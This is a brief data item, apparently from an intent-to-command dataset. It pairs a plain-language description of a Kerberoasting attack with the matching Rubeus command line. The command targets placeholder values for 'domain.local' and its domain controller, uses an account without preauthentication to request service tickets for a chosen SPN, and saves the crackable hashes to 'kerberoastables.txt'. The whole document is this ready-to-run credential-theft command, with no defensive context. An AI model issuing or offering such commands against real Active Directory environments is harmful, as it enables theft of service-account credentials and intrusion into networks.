# Natural language intent:
# perform Kerberoasting against the specified domain controller ("dc.domain.local") for the "domain.local" domain. It uses a user with no preauthentication ("NO_PREAUTH_USER") and targets a specific service principal name ("TARGET_SERVICE"), with the results saved to an output file named "kerberoastables.txt".

Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
